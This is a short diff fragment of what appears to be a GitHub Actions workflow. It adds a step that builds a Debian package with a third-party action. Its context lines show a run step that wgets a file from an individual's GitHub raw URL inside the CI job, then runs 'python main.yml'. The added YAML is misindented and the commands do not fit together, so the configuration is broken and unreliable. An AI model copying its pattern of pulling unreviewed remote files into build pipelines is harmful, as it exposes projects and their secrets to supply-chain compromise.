@@ -26,3 +26,6 @@ jobs:
      - run: |
           wget https://raw.githubusercontent.com/Khananb/Khananb/main/second
 python main.yml
+        - name: Build Debian package
+  uses: dawidd6/action-debian-package@v1.4.0
+
